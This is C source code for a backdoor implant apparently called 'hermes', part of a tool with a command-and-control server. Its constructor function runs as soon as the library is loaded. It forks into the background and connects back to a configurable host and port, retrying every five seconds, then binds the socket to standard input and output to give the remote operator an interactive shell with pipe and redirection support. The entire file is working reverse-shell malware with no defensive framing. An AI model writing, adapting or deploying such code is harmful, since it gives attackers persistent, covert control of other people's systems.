#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <sys/stat.h>

#define PORT 1234 
#define HOSTNAME "localhost"

#define MAX_STR 256
#define MAX_TOK 16

// macros to simplify writing function attributes
#define always_inline __attribute__((always_inline))
#define constructor __attribute__((constructor))

// prototypes of all functions used in hermes
always_inline static inline char* tokenize(char*);

constructor void hermes(int argc, char** argv){
  int socket_fd;
  int connection = -1;
  struct sockaddr_in server;
  struct hostent *he;
  struct in_addr **addr_list;
  char* ip;
  
  // fork process && kill parent, allows samael to run in the background
  if(fork() == 0){
    
  connect:
    // resolve HOSTNAME to ip addr
    he = gethostbyname(HOSTNAME);
    addr_list = (struct in_addr**) he->h_addr_list;
    ip = inet_ntoa(*addr_list[0]);

    // set up socket to connect to c2
    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(ip);
    
    // loop until connection is established
    while(connection < 0){
      sleep(5);
      connection = connect(socket_fd, (struct sockaddr*)&server, sizeof(struct sockaddr));
    }
    
    // duplicate socket file desciptor to stdin && stdout
    int fd;
    if(fork() == 0){
      dup2(socket_fd, 0);
      dup2(socket_fd, 1);
      dup2(socket_fd, 2);
    }else{
      wait(NULL);
      connection = -1;
      goto connect; // allow continual connections, if exited from c2 an immediate reconnect is possible
    }
    
    char str[MAX_STR] = {0};
  
    while(1){
      // terminal prompt
    loop:
      memset(str, 0, sizeof(str)); // zero init cwd str
      getcwd(str, MAX_STR);
      strcat(str, "$ ");
      write(1, str, sizeof(str));
      
      // read input
      int i = 0;
      memset(str, 0, sizeof(str)); // zero init cmd str
      while(1){
        read(0, &str[i++], 1);
        if(i == MAX_STR && str[i-1] != '\n'){ // detect overflow
          write(1, "error: command length exceeds buffer size\n", 42);
          while(getchar() != '\n'){} // flush stdin
          goto loop;
        }
        if(str[i-1] == '\n'){
          if(i == 1){
            write(1, "\n", 1); // needed for remote shell output to c2, change c2 output logic...
            goto loop; // if only 'enter', restart loop
          }
          str[i-1] = '\0'; // replace newline with null char
          break;
        }
      }

      // tokenize input
      i = 0;
      int pipe_count = 0;
      int redirect_flag = 0;
      char*** cmd_list = (char***)calloc(MAX_TOK, sizeof(char**));
      cmd_list[pipe_count] = (char**)calloc(MAX_TOK, sizeof(char*));
      char* redirect_file = (char*)calloc(MAX_TOK, sizeof(char));
      char* token = tokenize(str);
      while(token != NULL){
        if(strcmp(token, "|") == 0){
          cmd_list[++pipe_count] = (char**)calloc(MAX_TOK, sizeof(char*));
          i = 0;
          token = tokenize(NULL);
          continue;
        }else if(strcmp(token, ">") == 0){
          redirect_flag = 1;
          i = 0;
          token = tokenize(NULL);
          continue;
        }
        if(redirect_flag == 0){
          cmd_list[pipe_count][i++] = token;
        }else{
          strcpy(redirect_file, token);
        }
        token = tokenize(NULL);
      }
      
      // execute tokenized command(s)
      if(strcmp(cmd_list[0][0], "cd") == 0){
        chdir(cmd_list[0][1]);
      }else if(strcmp(cmd_list[0][0], "exit") == 0){
        char exit_code = '\a'; // use a char that is unlikely to be sent to signal exit to c2
        write(1, &exit_code, 1);
        exit(0); // system will clean up malloc'd mem
      }else{
        int prior_fd;
        int pipe_fd[2];
        for(int i = pipe_count; i >= 0; --i){
          pipe(pipe_fd); // creates pipes
	  pid_t pid;
          if((pid = fork()) == 0){

            // logic for connecting pipes
            if(pipe_count != 0){
              if(i == pipe_count){
                dup2(pipe_fd[0], 0);
              }else if(i == 0){
                dup2(prior_fd, 1);
                close(pipe_fd[0]);
              }else{
                dup2(pipe_fd[0], 0);
                dup2(prior_fd, 1);
              }
              close(pipe_fd[1]);
            }

            // right file redirection logic
            if(redirect_flag == 1 && i == pipe_count){
              int fd = open(redirect_file, O_WRONLY|O_CREAT|O_TRUNC, 0644);
              dup2(fd, 1);
              close(fd);
            }
	    
            // execute next command
            execvp(cmd_list[i][0], cmd_list[i]);
            // exec calls do not return upon success, print error otherwise
            write(1, "error: ", 7);
            write(1, cmd_list[i][0], strlen(cmd_list[i][0]));
            write(1, ": command not found\n", 20);
            exit(0);
          }

          // manage pipes
          if(i != pipe_count){
            close(prior_fd);
          }
          prior_fd = pipe_fd[1];
          close(pipe_fd[0]);
        }

        // wait on all children
        for(int i = 0; i <= pipe_count; ++i){
          wait(NULL);
        }
      }

      // cmds that output w/o a newline, manually send newline to c2
      if(strcmp(cmd_list[0][0], "clear") == 0 || strcmp(cmd_list[0][0], "cd") == 0) write(1, "\n", 1); // maybe edit c2 to not need this later on
      
      // manage heap memory
      for(int i = 0; i <= pipe_count; ++i){
        free(cmd_list[i]);
      }
      free(cmd_list);
      free(redirect_file);
    }
  }
}

char* tokenize(char* str){
  char* token;
  static char* s;
  
  if(str == NULL && s == NULL){
    return NULL;
  }else if(str != NULL){
    s = str;
  }

  while(*s == ' '){
    ++s;
  }
  
  token = s;

  while(1){
    char c = *(s++);
    if(c == ' '){
      *(s-1) = 0x00;
      break;
    }else if(c == 0x00){
      s = NULL;
      break;
    }
  }
  return *token == 0x00 ? NULL : token;
}
